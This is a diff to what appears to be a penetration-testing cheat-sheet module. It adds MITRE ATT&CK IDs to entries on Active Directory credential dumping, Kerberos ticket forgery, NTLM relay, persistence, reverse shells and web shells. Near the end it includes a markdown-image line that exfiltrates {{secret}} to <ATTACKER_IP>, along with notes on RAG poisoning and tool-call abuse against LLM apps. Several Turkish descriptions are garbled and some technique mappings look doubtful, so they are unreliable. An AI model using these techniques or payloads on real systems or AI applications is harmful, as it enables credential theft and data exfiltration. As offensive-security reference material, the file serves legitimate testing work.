-            "desc_tr": "Execute command via Task Scheduler"
+            "desc_tr": "Execute command via Task Scheduler",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "DCOMExec Remote Shell",
@@ -21780,7 +25231,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Get TGS tickets for Kerberoasting"
+            "desc_tr": "Get TGS tickets for Kerberoasting",
+            "attack": [
+              "T1558.003"
+            ]
           },
           {
             "title": "GetUserSPNs with Hash",
@@ -21789,7 +25243,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kerberoast NTLM hash kullanarak"
+            "desc_tr": "Kerberoast NTLM hash kullanarak",
+            "attack": [
+              "T1558.003",
+              "T1550.002"
+            ]
           },
           {
             "title": "GetNPUsers (ASREPRoast)",
@@ -21799,7 +25257,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Get AS-REP hashes for roasting"
+            "desc_tr": "Get AS-REP hashes for roasting",
+            "attack": [
+              "T1558.004",
+              "T1110.002"
+            ]
           },
           {
             "title": "GetNPUsers Single User",
@@ -21808,7 +25270,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "AS-REP roast a belirli user"
+            "desc_tr": "AS-REP roast a belirli user",
+            "attack": [
+              "T1558.004",
+              "T1110.002"
+            ]
           },
           {
             "title": "getTGT Get Ticket",
@@ -21835,7 +25301,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Sahte oluştur: silver ticket"
+            "desc_tr": "Sahte oluştur: silver ticket",
+            "attack": [
+              "T1558.002"
+            ]
           },
           {
             "title": "Ticketer Golden Ticket",
@@ -21844,7 +25313,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Sahte oluştur: golden ticket krbtgt hash ile"
+            "desc_tr": "Sahte oluştur: golden ticket krbtgt hash ile",
+            "attack": [
+              "T1558.001"
+            ]
           },
           {
             "title": "Use Kerberos Ticket",
@@ -21869,7 +25341,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Dump SAM and LSA secrets remotely"
+            "desc_tr": "Dump SAM and LSA secrets remotely",
+            "attack": [
+              "T1003"
+            ]
           },
           {
             "title": "SecretsDump with Hash",
@@ -21878,7 +25353,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dump secrets using NTLM hash"
+            "desc_tr": "Dump secrets using NTLM hash",
+            "attack": [
+              "T1003",
+              "T1550.002"
+            ]
           },
           {
             "title": "SecretsDump DCSync",
@@ -21887,7 +25366,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "DCSync get tüm domahashes'e içinde"
+            "desc_tr": "DCSync get tüm domahashes'e içinde",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "SecretsDump Just NTLM",
@@ -21896,7 +25379,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Get only NTLM hashes from DC"
+            "desc_tr": "Get only NTLM hashes from DC",
+            "attack": [
+              "T1003"
+            ]
           },
           {
             "title": "SecretsDump from NTDS",
@@ -21905,7 +25391,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Dump from copied NTDS.dit file"
+            "desc_tr": "Dump from copied NTDS.dit file",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           }
         ],
         "name_tr": "Credential Dumping"
@@ -21921,7 +25411,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Relay NTLM auth to execute commands"
+            "desc_tr": "Relay NTLM auth to execute commands",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay Interactive Shell",
@@ -21930,7 +25423,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Get interactive SMB shell via relay"
+            "desc_tr": "Get interactive SMB shell via relay",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay Execute Command",
@@ -21939,7 +25435,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Execute command via relay"
+            "desc_tr": "Execute command via relay",
+            "attack": [
+              "T1557.001",
+              "T1033"
+            ]
           },
           {
             "title": "NTLM Relay to LDAP (DA)",
@@ -21948,7 +25448,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Relay to LDAP to add user to DA"
+            "desc_tr": "Relay to LDAP to add user to DA",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "NTLM Relay MultiRelay",
@@ -21957,7 +25460,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Relay to multiple targets from list"
+            "desc_tr": "Relay to multiple targets from list",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "Responder Start",
@@ -21967,7 +25473,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Start Responder to capture NTLM hashes"
+            "desc_tr": "Start Responder to capture NTLM hashes",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "Responder without SMB/HTTP",
@@ -21977,7 +25486,10 @@ module.exports = [
               "essential"
             ],
             "note": "Disable SMB and HTTP in /etc/responder/Responder.conf first",
-            "desc_tr": "Run Responder while ntlmrelayx is active"
+            "desc_tr": "Run Responder while ntlmrelayx is active",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "Mitm6 IPv6 Poisoning",
@@ -21987,7 +25499,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "NTLM yakalama için IPv6 DNS ele geçirme"
+            "desc_tr": "NTLM yakalama için IPv6 DNS ele geçirme",
+            "attack": [
+              "T1557.001"
+            ]
           }
         ],
         "name_tr": "Network Attacks"
@@ -22073,7 +25588,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dump cleartext passwords and NTLM hashes from LSASS"
+            "desc_tr": "Dump cleartext passwords and NTLM hashes from LSASS",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Sekurlsa WDIGEST",
@@ -22109,7 +25627,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dump all credential types at once"
+            "desc_tr": "Dump all credential types at once",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Sekurlsa DPAPI Keys",
@@ -22118,7 +25639,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Extract DPAPI master keys"
+            "desc_tr": "Extract DPAPI master keys",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "Enable WDigest",
@@ -22161,7 +25685,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "DCSync attack — dump belirli user hash"
+            "desc_tr": "DCSync attack — dump belirli user hash",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "LSADUMP DCSYNC All",
@@ -22170,7 +25698,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "DCSync tüm domahashes içinde"
+            "desc_tr": "DCSync tüm domahashes içinde",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "LSADUMP Secrets",
@@ -22179,7 +25711,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dump LSA secrets (service account creds, DPAPI)"
+            "desc_tr": "Dump LSA secrets (service account creds, DPAPI)",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "LSADUMP Cache",
@@ -22212,7 +25747,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: a .kirbi ticket insession'e"
+            "desc_tr": "Enjekte et: a .kirbi ticket insession'e",
+            "attack": [
+              "T1550.003"
+            ]
           },
           {
             "title": "Kerberos Purge Tickets",
@@ -22230,7 +25768,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Create a golden ticket"
+            "desc_tr": "Create a golden ticket",
+            "attack": [
+              "T1558.001",
+              "T1550.003"
+            ]
           },
           {
             "title": "Silver Ticket",
@@ -22239,7 +25781,12 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Create a silver ticket for a service"
+            "desc_tr": "Create a silver ticket for a service",
+            "attack": [
+              "T1558.001",
+              "T1558.002",
+              "T1550.003"
+            ]
           },
           {
             "title": "Overpass-the-Hash",
@@ -22248,7 +25795,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Use NTLM hash get a Kerberos TGT'e"
+            "desc_tr": "Use NTLM hash get a Kerberos TGT'e",
+            "attack": [
+              "T1059.003",
+              "T1550.002"
+            ]
           }
         ],
         "name_tr": "Kerberos Tickets"
@@ -22263,7 +25814,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: inLSASS process for kimlik bilgileri access'e"
+            "desc_tr": "Enjekte et: inLSASS process for kimlik bilgileri access'e",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Vault Credentials",
@@ -22300,7 +25854,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Allows logging in with 'mimikatz' as any user's password — AD-wide",
-            "desc_tr": "Patch DC to allow skeleton key password"
+            "desc_tr": "Patch DC to allow skeleton key password",
+            "attack": [
+              "T1556"
+            ]
           }
         ],
         "name_tr": "Misc Mimikatz"
@@ -22325,7 +25882,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Get OS, hostname, and patch level"
+            "desc_tr": "Get OS, hostname, and patch level",
+            "attack": [
+              "T1082"
+            ]
           },
           {
             "title": "Current User & Groups",
@@ -22334,7 +25894,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Mevcut kullanıcı ve grup üyeliklerini göster"
+            "desc_tr": "Mevcut kullanıcı ve grup üyeliklerini göster",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "Net Users",
@@ -22343,7 +25906,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List local users"
+            "desc_tr": "List local users",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Net Local Groups",
@@ -22352,7 +25918,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List local groups"
+            "desc_tr": "List local groups",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Local Admins",
@@ -22361,7 +25930,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List local administrator group members"
+            "desc_tr": "List local administrator group members",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Domain Users",
@@ -22370,7 +25942,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List domain users"
+            "desc_tr": "List domain users",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Domain Groups",
@@ -22379,7 +25954,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Domain gruplarını listele"
+            "desc_tr": "Domain gruplarını listele",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Domain Controllers",
@@ -22388,7 +25966,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find domain controllers"
+            "desc_tr": "Find domain controllers",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Network Interfaces",
@@ -22397,7 +25978,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show all network interfaces and IPs"
+            "desc_tr": "Show all network interfaces and IPs",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "ARP Table",
@@ -22406,7 +25990,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show ARP cache for host discovery"
+            "desc_tr": "Show ARP cache for host discovery",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Routing Table",
@@ -22415,7 +26002,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yönlendirme tablosunu göster"
+            "desc_tr": "Yönlendirme tablosunu göster",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Listening Ports",
@@ -22424,7 +26014,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dinlenen tüm portları göster"
+            "desc_tr": "Dinlenen tüm portları göster",
+            "attack": [
+              "T1049"
+            ]
           },
           {
             "title": "Active Connections",
@@ -22433,7 +26026,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show all active connections"
+            "desc_tr": "Show all active connections",
+            "attack": [
+              "T1049"
+            ]
           },
           {
             "title": "Running Processes",
@@ -22442,7 +26038,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all running processes with PID"
+            "desc_tr": "List all running processes with PID",
+            "attack": [
+              "T1057"
+            ]
           },
           {
             "title": "Processes with Network",
@@ -22451,7 +26050,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Match processes network connections'e"
+            "desc_tr": "Match processes network connections'e",
+            "attack": [
+              "T1049"
+            ]
           },
           {
             "title": "Installed Software",
@@ -22460,7 +26062,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List installed programs"
+            "desc_tr": "List installed programs",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Installed Patches",
@@ -22469,7 +26074,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List installed Windows patches"
+            "desc_tr": "List installed Windows patches",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Scheduled Tasks",
@@ -22478,7 +26086,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tüm zamanlanmış görevleri listele"
+            "desc_tr": "Tüm zamanlanmış görevleri listele",
+            "attack": [
+              "T1053.005"
+            ]
           },
           {
             "title": "Services Running",
@@ -22496,7 +26107,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PowerShell komut geçmişini oku"
+            "desc_tr": "PowerShell komut geçmişini oku",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Environment Variables",
@@ -22523,7 +26137,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: installed antivirus WMI üzerinden"
+            "desc_tr": "Kontrol et: installed antivirus WMI üzerinden",
+            "attack": [
+              "T1047"
+            ]
           }
         ],
         "name_tr": "Situational Awareness"
@@ -22538,7 +26155,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Search all files for password string"
+            "desc_tr": "Search all files for password string",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Search Specific Extensions",
@@ -22578,7 +26198,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Look for unattended installatifiles üzerinde"
+            "desc_tr": "Look for unattended installatifiles üzerinde",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "SAM & SYSTEM Files",
@@ -22590,7 +26213,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Copy SAM/SYSTEM for offline cracking"
+            "desc_tr": "Copy SAM/SYSTEM for offline cracking",
+            "attack": [
+              "T1003.002"
+            ]
           },
           {
             "title": "DPAPI Blob Hunt",
@@ -22599,7 +26225,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Find DPAPI blobs (credential files)"
+            "desc_tr": "Find DPAPI blobs (credential files)",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "WiFi Passwords",
@@ -22626,7 +26255,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Find Chrome password database"
+            "desc_tr": "Find Chrome password database",
+            "attack": [
+              "T1555.003"
+            ]
           },
           {
             "title": "IIS Web.config",
@@ -22649,7 +26281,10 @@ module.exports = [
               "tool"
             ],
             "note": "Copy Firefox profile from target: C:\\Users\\<USER>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\",
-            "desc_tr": "Şifreyi çöz: kayıtlı Firefox passwords profile directory üzerinden"
+            "desc_tr": "Şifreyi çöz: kayıtlı Firefox passwords profile directory üzerinden",
+            "attack": [
+              "T1555.003"
+            ]
           }
         ],
         "name_tr": "Credential Hunting"
@@ -22700,7 +26335,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Restart a uzak machine"
+            "desc_tr": "Restart a uzak machine",
+            "attack": [
+              "T1059.003"
+            ]
           },
           {
             "title": "Certutil Download File",
@@ -22709,7 +26347,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Download file using Windows built-in certutil (LOLBin)"
+            "desc_tr": "Download file using Windows built-in certutil (LOLBin)",
+            "attack": [
+              "T1105"
+            ]
           }
         ],
         "name_tr": "System Control Commands"
@@ -22724,7 +26365,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Add persistence via HKCU Run key"
+            "desc_tr": "Add persistence via HKCU Run key",
+            "attack": [
+              "T1547.001"
+            ]
           },
           {
             "title": "Registry Run Key (System)",
@@ -22733,7 +26377,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Add persistence via HKLM Run key (requires admin)"
+            "desc_tr": "Add persistence via HKLM Run key (requires admin)",
+            "attack": [
+              "T1547.001"
+            ]
           },
           {
             "title": "Scheduled Task Persistence",
@@ -22742,7 +26389,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Create scheduled task for persistence"
+            "desc_tr": "Create scheduled task for persistence",
+            "attack": [
+              "T1053.005"
+            ]
           },
           {
             "title": "New Service",
@@ -22754,7 +26404,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Create new Windows service for persistence"
+            "desc_tr": "Create new Windows service for persistence",
+            "attack": [
+              "T1543.003"
+            ]
           },
           {
             "title": "Startup Folder User",
@@ -22787,7 +26440,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: mevcut token privileges"
+            "desc_tr": "Kontrol et: mevcut token privileges",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "Incognito List Tokens",
@@ -22797,7 +26453,10 @@ module.exports = [
               "tool"
             ],
             "note": "Run in Meterpreter with load incognito",
-            "desc_tr": "List available impersonation tokens"
+            "desc_tr": "List available impersonation tokens",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "Incognito Impersonate",
@@ -22806,7 +26465,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kimliğe bürün: a listed token"
+            "desc_tr": "Kimliğe bürün: a listed token",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "PrintSpoofer (SeImpersonate)",
@@ -22815,7 +26477,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yetki yükselt: SeImpersonatePrivilege üzerinden"
+            "desc_tr": "Yetki yükselt: SeImpersonatePrivilege üzerinden",
+            "attack": [
+              "T1059.003",
+              "T1134.001"
+            ]
           },
           {
             "title": "GodPotato (SeImpersonate)",
@@ -22824,7 +26490,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "NT AUTHORITY\\SYSTEM SeImpersonate üzerinden"
+            "desc_tr": "NT AUTHORITY\\SYSTEM SeImpersonate üzerinden",
+            "attack": [
+              "T1033",
+              "T1059.003",
+              "T1134.001"
+            ]
           },
           {
             "title": "JuicyPotatoNG",
@@ -22833,7 +26504,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Token impersonatifor SYSTEM üzerinde"
+            "desc_tr": "Token impersonatifor SYSTEM üzerinde",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "RunAs Different User",
@@ -22842,7 +26516,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run process as different user"
+            "desc_tr": "Run process as different user",
+            "attack": [
+              "T1059.003"
+            ]
           },
           {
             "title": "RunAs with Saved Cred",
@@ -22851,7 +26528,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Run as user with saved credentials"
+            "desc_tr": "Run as user with saved credentials",
+            "attack": [
+              "T1059.003"
+            ]
           }
         ],
         "name_tr": "Token & Impersonation"
@@ -22876,7 +26556,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show current user and all groups"
+            "desc_tr": "Show current user and all groups",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "System Info",
@@ -22885,7 +26568,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "OS versiand kernel üzerinde"
+            "desc_tr": "OS versiand kernel üzerinde",
+            "attack": [
+              "T1082"
+            ]
           },
           {
             "title": "All Users",
@@ -22903,7 +26589,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: sudo permissions"
+            "desc_tr": "Kontrol et: sudo permissions",
+            "attack": [
+              "T1548.003"
+            ]
           },
           {
             "title": "Network Interfaces",
@@ -22912,7 +26601,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show all network interfaces"
+            "desc_tr": "Show all network interfaces",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Routing Table",
@@ -22930,7 +26622,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show ARP table for host discovery"
+            "desc_tr": "Show ARP table for host discovery",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Listening Ports",
@@ -22939,7 +26634,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dinlenen tüm portları göster"
+            "desc_tr": "Dinlenen tüm portları göster",
+            "attack": [
+              "T1049"
+            ]
           },
           {
             "title": "All Connections",
@@ -22948,7 +26646,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show all active network connections"
+            "desc_tr": "Show all active network connections",
+            "attack": [
+              "T1049"
+            ]
           },
           {
             "title": "Running Processes",
@@ -22966,7 +26667,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find processes running as root"
+            "desc_tr": "Find processes running as root",
+            "attack": [
+              "T1057"
+            ]
           },
           {
             "title": "Cron Jobs",
@@ -22979,7 +26683,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: tüm crgörevleri files üzerinde"
+            "desc_tr": "Kontrol et: tüm crgörevleri files üzerinde",
+            "attack": [
+              "T1053.003"
+            ]
           },
           {
             "title": "Bash History",
@@ -22988,7 +26695,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Read command history"
+            "desc_tr": "Read command history",
+            "attack": [
+              "T1552.003"
+            ]
           },
           {
             "title": "Recently Modified Files",
@@ -23024,7 +26734,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SUID binary'lerini bul"
+            "desc_tr": "SUID binary'lerini bul",
+            "attack": [
+              "T1548.001"
+            ]
           },
           {
             "title": "SGID Files",
@@ -23066,7 +26779,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find all SSH private keys"
+            "desc_tr": "Find all SSH private keys",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Config Files",
@@ -23084,7 +26800,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find web application config files"
+            "desc_tr": "Find web application config files",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "MySQL Credentials",
@@ -23111,7 +26830,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Read /etc/shadow if accessible"
+            "desc_tr": "Read /etc/shadow if accessible",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "Stored SSH Keys",
@@ -23120,7 +26842,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Find authorized_keys files"
+            "desc_tr": "Find authorized_keys files",
+            "attack": [
+              "T1098.004"
+            ]
           },
           {
             "title": "History Files",
@@ -23129,7 +26854,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find all shell history files"
+            "desc_tr": "Find all shell history files",
+            "attack": [
+              "T1552.003"
+            ]
           },
           {
             "title": "Last Login",
@@ -23153,7 +26881,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Add SSH public key to authorized_keys"
+            "desc_tr": "Add SSH public key to authorized_keys",
+            "attack": [
+              "T1098.004"
+            ]
           },
           {
             "title": "Cron Job Reverse Shell",
@@ -23162,7 +26893,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Add cron job for reverse shell persistence"
+            "desc_tr": "Add cron job for reverse shell persistence",
+            "attack": [
+              "T1059.004",
+              "T1053.003"
+            ]
           },
           {
             "title": "SUID Bash Copy",
@@ -23175,7 +26910,11 @@ module.exports = [
               "advanced"
             ],
             "note": "Then: /tmp/.bash -p for root shell",
-            "desc_tr": "Create SUID copy of bash for persistence"
+            "desc_tr": "Create SUID copy of bash for persistence",
+            "attack": [
+              "T1059.004",
+              "T1548.001"
+            ]
           },
           {
             "title": ".bashrc Persistence",
@@ -23184,7 +26923,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Add payload to .bashrc for login persistence"
+            "desc_tr": "Add payload to .bashrc for login persistence",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Systemd Service Persistence",
@@ -23318,7 +27060,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Convert .cap to hashcat format (22000)"
+            "desc_tr": "Convert .cap to hashcat format (22000)",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "Crack WPA with Hashcat",
@@ -23327,7 +27072,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Crack WPA hash with hashcat"
+            "desc_tr": "Crack WPA hash with hashcat",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "PMKID Attack",
@@ -23478,7 +27226,10 @@ module.exports = [
               "essential"
             ],
             "note": "Browse to http://burp with proxy active, or use this curl command",
-            "desc_tr": "Download and install Burp CA cert for HTTPS interception"
+            "desc_tr": "Download and install Burp CA cert for HTTPS interception",
+            "attack": [
+              "T1105"
+            ]
           },
           {
             "title": "SQLMap Through Burp",
@@ -23487,7 +27238,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Route SQLMap traffic through Burp for inspection"
+            "desc_tr": "Route SQLMap traffic through Burp for inspection",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Nikto Through Burp",
@@ -23505,7 +27259,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Route Gobuster through Burp proxy"
+            "desc_tr": "Route Gobuster through Burp proxy",
+            "attack": [
+              "T1595.003"
+            ]
           }
         ],
         "name_tr": "Proxy Setup & Configuration"
@@ -23649,7 +27406,10 @@ module.exports = [
               "essential"
             ],
             "note": "Used with: sqlmap -r request.txt",
-            "desc_tr": "Save a request for use with sqlmap -r flag"
+            "desc_tr": "Save a request for use with sqlmap -r flag",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "Repeater & Common Workflows"
@@ -23905,7 +27665,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PowerShell ters bağlantı kabuğu as command"
+            "desc_tr": "PowerShell ters bağlantı kabuğu as command",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Windows Shellcode (C)",
@@ -23998,7 +27761,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP ters bağlantı kabuğu for web upload"
+            "desc_tr": "PHP ters bağlantı kabuğu for web upload",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Meterpreter",
@@ -24016,7 +27782,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "JSP ters bağlantı kabuğu for Java servers"
+            "desc_tr": "JSP ters bağlantı kabuğu for Java servers",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "WAR Reverse Shell",
@@ -24034,7 +27803,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "IIS sunucuları için ASPX kabuğu"
+            "desc_tr": "IIS sunucuları için ASPX kabuğu",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "NodeJS Reverse Shell",
@@ -50588,6 +54360,9 @@ module.exports = [
             "tags": [
               "advanced",
               "tool"
+            ],
+            "attack": [
+              "T1190"
             ]
           },
           {
@@ -50912,7 +54687,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "note": "Upload poison.txt where the app performs retrieval/summarization"
+            "note": "Upload poison.txt where the app performs retrieval/summarization",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Tool/function-call abuse",
@@ -50939,6 +54717,9 @@ module.exports = [
             "cmd": "echo '![x](http://<ATTACKER_IP>/leak?data={{secret}})'",
             "tags": [
               "advanced"
+            ],
+            "attack": [
+              "T1048"
             ]
           },
           {
@@ -51043,6 +54824,9 @@ module.exports = [
             "tags": [
               "advanced",
               "tool"
+            ],
+            "attack": [
+              "T1059.006"
             ]
           },
           {
@@ -51052,6 +54836,9 @@ module.exports = [
             "cmd": "python3 -c \"from safetensors.torch import load_file; load_file('<MODEL_FILE>')\"",
             "tags": [
               "tool"
+            ],
+            "attack": [
+              "T1059.006"
             ]
           },
           {
@@ -51111,6 +54898,9 @@ module.exports = [
             "cmd": "python3 -c \"from llm_guard import scan_prompt; print(scan_prompt([], '<PROMPT>'))\"",
             "tags": [
               "tool"
+            ],
+            "attack": [
+              "T1059.006"
             ]
           },
